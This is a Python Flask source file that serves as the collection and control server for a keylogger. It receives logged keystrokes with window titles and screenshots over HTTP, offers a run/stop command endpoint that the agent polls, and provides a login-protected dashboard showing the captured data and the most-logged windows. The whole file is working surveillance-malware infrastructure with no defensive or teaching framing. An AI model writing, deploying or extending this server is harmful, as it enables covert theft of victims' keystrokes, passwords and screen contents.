from flask import Flask, request, jsonify, render_template, redirect, url_for, session
from datetime import datetime
from collections import deque
import os
from functools import wraps

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-this-in-production")

# ── In-memory stores ──────────────────────────
MAX_EVENTS      = 1000
MAX_SCREENSHOTS = 20

events      = deque(maxlen=MAX_EVENTS)
screenshots = deque(maxlen=MAX_SCREENSHOTS)

# Agent state — "run" or "stop"
agent_command = "run"

# ── Auth ──────────────────────────────────────
DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "admin123")

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("password") == DASHBOARD_PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        error = "Invalid password"
    return render_template("login.html", error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ── Keylogger API ─────────────────────────────

@app.route("/log", methods=["POST"])
def receive_log():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid JSON"}), 400
    entry = {
        "timestamp":   data.get("timestamp", datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")),
        "window":      data.get("window", "Unknown"),
        "key":         data.get("key", ""),
        "received_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
    }
    events.appendleft(entry)
    return jsonify({"status": "ok"}), 200


@app.route("/screenshot", methods=["POST"])
def receive_screenshot():
    data = request.get_json(silent=True)
    if not data or "image" not in data:
        return jsonify({"error": "No image"}), 400
    entry = {
        "timestamp": data.get("timestamp", datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")),
        "window":    data.get("window", "Unknown"),
        "image":     data["image"],
    }
    screenshots.appendleft(entry)
    return jsonify({"status": "ok"}), 200


@app.route("/command", methods=["GET"])
def get_command():
    """Keylogger polls this to check if it should run or stop."""
    return jsonify({"command": agent_command})


@app.route("/command", methods=["POST"])
@login_required
def set_command():
    """Dashboard sets the command — run or stop."""
    global agent_command
    data = request.get_json(silent=True)
    cmd  = data.get("command") if data else None
    if cmd not in ("run", "stop"):
        return jsonify({"error": "Invalid command"}), 400
    agent_command = cmd
    return jsonify({"status": "ok", "command": agent_command})


# ── Dashboard ─────────────────────────────────

@app.route("/")
@login_required
def dashboard():
    return render_template("dashboard.html")

@app.route("/api/events")
@login_required
def api_events():
    page     = int(request.args.get("page", 1))
    per_page = 50
    all_ev   = list(events)
    start    = (page - 1) * per_page
    return jsonify({
        "events":   all_ev[start:start + per_page],
        "total":    len(all_ev),
        "page":     page,
        "per_page": per_page,
    })

@app.route("/api/screenshots")
@login_required
def api_screenshots():
    limit = int(request.args.get("limit", 20))
    return jsonify({
        "screenshots": list(screenshots)[:limit],
        "total":       len(screenshots),
    })

@app.route("/api/stats")
@login_required
def api_stats():
    all_ev  = list(events)
    windows = {}
    for e in all_ev:
        w = e.get("window", "Unknown")
        windows[w] = windows.get(w, 0) + 1
    top = sorted(windows.items(), key=lambda x: x[1], reverse=True)[:5]
    return jsonify({
        "total_keystrokes":  len(all_ev),
        "total_screenshots": len(screenshots),
        "top_windows":       [{"window": w, "count": c} for w, c in top],
        "agent_command":     agent_command,
    })

@app.route("/api/clear", methods=["POST"])
@login_required
def clear_logs():
    events.clear()
    screenshots.clear()
    return jsonify({"status": "cleared"})

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)